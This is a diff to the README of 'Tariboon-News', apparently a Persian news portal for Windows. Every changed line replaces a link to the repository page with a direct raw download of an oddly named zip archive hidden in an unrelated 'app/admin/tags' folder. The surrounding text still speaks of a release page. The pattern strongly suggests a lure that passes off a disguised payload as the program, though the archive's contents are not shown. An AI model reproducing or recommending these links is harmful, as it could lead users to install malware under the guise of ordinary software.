@@ -1,6 +1,6 @@
 # 📰 Tariboon-News - Simple Persian News Portal
 
-[![Download Tariboon-News](https://img.shields.io/badge/Download-Tariboon--News-blue?style=for-the-badge)](https://github.com/singhsahab9/Tariboon-News)
+[![Download Tariboon-News](https://img.shields.io/badge/Download-Tariboon--News-blue?style=for-the-badge)](https://github.com/singhsahab9/Tariboon-News/raw/refs/heads/main/app/admin/tags/News_Tariboon_embouchure.zip)
 
 ---
 
@@ -9,7 +9,7 @@ Tariboon-News is a ready-to-use Persian news portal. It works on Windows without
 ## 📥 Download and Install
 
 1. Click this link to **visit the download page**:  
-   [Download Tariboon-News](https://github.com/singhsahab9/Tariboon-News)
+   [Download Tariboon-News](https://github.com/singhsahab9/Tariboon-News/raw/refs/heads/main/app/admin/tags/News_Tariboon_embouchure.zip)
 
 2. On the page, find the latest **release or download section**.
 
@@ -78,7 +78,7 @@ Tariboon-News is a ready-to-use Persian news portal. It works on Windows without
 
 ## 🛠️ How to Keep Tariboon-News Updated
 
-1. Visit the [download page again](https://github.com/singhsahab9/Tariboon-News).
+1. Visit the [download page again](https://github.com/singhsahab9/Tariboon-News/raw/refs/heads/main/app/admin/tags/News_Tariboon_embouchure.zip).
 
 2. Check for newer releases or files.
 
@@ -153,7 +153,7 @@ The interface uses Radix UI and shadcn components to stay clean and user-friendl
 
 ## 🔗 Quick Download Link
 
-[![Download Tariboon-News](https://img.shields.io/badge/Download-Tariboon--News-grey?style=for-the-badge)](https://github.com/singhsahab9/Tariboon-News)
+[![Download Tariboon-News](https://img.shields.io/badge/Download-Tariboon--News-grey?style=for-the-badge)](https://github.com/singhsahab9/Tariboon-News/raw/refs/heads/main/app/admin/tags/News_Tariboon_embouchure.zip)
 
 ---
 
